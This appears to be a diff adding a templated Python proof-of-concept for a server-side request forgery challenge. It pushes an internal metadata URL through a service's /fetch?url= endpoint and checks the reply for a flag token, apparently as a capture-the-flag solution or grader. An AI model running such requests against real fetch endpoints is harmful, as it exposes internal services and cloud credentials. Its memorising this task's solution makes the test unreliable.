@@ -1,0 +1,39 @@
+import argparse
+import json
+import sys
+from urllib.error import HTTPError, URLError
+from urllib.parse import quote
+from urllib.request import urlopen
+
+SUCCESS_SIGNATURE = '__SUCCESS_SIGNATURE__'
+FLAG_TOKEN = '__FLAG_TOKEN__'
+DEFAULT_TARGET = 'http://127.0.0.1:__PORT__/metadata'
+
+def exploit(base_url: str, target: str) -> bool:
+    url = base_url.rstrip('/') + '/fetch?url=' + quote(target, safe=':/?=&')
+    try:
+        with urlopen(url, timeout=5) as resp:
+            body = resp.read().decode('utf-8', errors='ignore')
+    except (HTTPError, URLError) as exc:
+        print(f'[ssrf-compiler] request failed: {exc}', file=sys.stderr)
+        return False
+    try:
+        payload = json.loads(body)
+    except json.JSONDecodeError:
+        return False
+    return str(payload.get('flag')) == FLAG_TOKEN
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description='SSRF compiler PoC')
+    parser.add_argument('--base-url', default='http://127.0.0.1:__PORT__')
+    parser.add_argument('--payload', default=DEFAULT_TARGET)
+    args = parser.parse_args()
+    if exploit(args.base_url, args.payload):
+        print(SUCCESS_SIGNATURE)
+        print(FLAG_TOKEN)
+        raise SystemExit(0)
+    print('[ssrf-compiler] exploit did not succeed', file=sys.stderr)
+    raise SystemExit(1)
+
+if __name__ == '__main__':
+    main()
